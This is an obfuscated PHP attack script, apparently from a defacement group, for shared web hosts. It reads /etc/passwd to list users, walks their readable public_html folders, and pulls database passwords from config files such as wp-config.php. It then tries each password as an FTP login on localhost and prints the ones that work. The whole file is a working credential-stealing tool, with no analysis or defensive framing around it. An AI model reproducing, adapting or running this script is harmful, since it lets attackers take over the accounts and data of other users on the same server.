<?php
echo '<html>'; echo '<title>Edited By KingDefacer</title><body>'; set_time_limit(0); @($sp42f421 = fopen('/etc/passwd', 'r')); if (!$sp42f421) { echo '[-] Error : coudn\'t read /etc/passwd'; die; } $sp1a19da = array(); $sp379634 = array(); $spbd4136 = array(); $sp6c3e91 = 0; while (!feof($sp42f421)) { $sp6ff357 = fgets($sp42f421); if ($sp6c3e91 > 35) { $sp999b54 = strpos($sp6ff357, ':'); $sp344d18 = substr($sp6ff357, 0, $sp999b54); $spccca05 = "/home/{$sp344d18}/public_html/"; if ($sp344d18 != '') { if (is_readable($spccca05)) { array_push($sp379634, $sp344d18); array_push($sp1a19da, $spccca05); } } } $sp6c3e91++; } echo '<br><br>'; echo '<textarea name=\'main_window\' cols=100 rows=20>'; echo '[+] Founded ' . sizeof($sp379634) . ' entrys in /etc/passwd
'; echo '[+] Founded ' . sizeof($sp1a19da) . ' readable public_html directories
'; echo '[~] Searching for passwords in config.* files...

'; foreach ($sp379634 as $sp877a3d) { $sp49de29 = "/home/{$sp877a3d}/public_html/"; read_dir($sp49de29, $sp877a3d); } echo '
[+] Done
'; function read_dir($sp49de29, $sp344d18) { if ($spc1a0af = opendir($sp49de29)) { while (false !== ($spa3ecf0 = readdir($spc1a0af))) { $sp9ad43b = "{$sp49de29}{$spa3ecf0}"; if ($spa3ecf0 != '.' and $spa3ecf0 != '..') { if (is_readable($sp9ad43b)) { $sp1ddc4e = "{$sp9ad43b}/"; if (is_dir($sp1ddc4e)) { read_dir($sp1ddc4e, $sp344d18); } else { if ($spa3ecf0 == 'config.php' or $spa3ecf0 == 'config.inc.php' or $spa3ecf0 == 'db.inc.php' or $spa3ecf0 == 'connect.php' or $spa3ecf0 == 'wp-config.php' or $spa3ecf0 == 'var.php' or $spa3ecf0 == 'configure.php' or $spa3ecf0 == 'db.php' or $spa3ecf0 == 'db_connect.php') { $sp83677c = get_pass($sp9ad43b); if ($sp83677c != '') { echo "[+] {$sp9ad43b}\n{$sp83677c}\n"; ftp_check($sp344d18, $sp83677c); } } } } } } } } function get_pass($sp89e107) { @($spfc25ba = fopen($sp89e107, 'r')); while (!feof($spfc25ba)) { $sp91b79a = fgets($spfc25ba); if (strstr($sp91b79a, 'pass') or strstr($sp91b79a, 'password') or strstr($sp91b79a, 'passwd')) { if (strrpos($sp91b79a, '"')) { $sp83677c = substr($sp91b79a, strpos($sp91b79a, '=') + 3, strrpos($sp91b79a, '"') - (strpos($sp91b79a, '=') + 3)); } else { $sp83677c = substr($sp91b79a, strpos($sp91b79a, '=') + 3, strrpos($sp91b79a, '\'') - (strpos($sp91b79a, '=') + 3)); } return $sp83677c; } } } function ftp_check($spea63b2, $sp83677c) { @($spa8152e = ftp_connect('127.0.0.1')); if ($spa8152e) { @($spfd181b = ftp_login($spa8152e, $spea63b2, $sp83677c)); if ($spfd181b) { echo '[FTP] ' . $spea63b2 . ':' . $sp83677c . '  Success
'; } else { ftp_quit($spa8152e); } } } echo '</textarea><br>'; echo '</body></html>';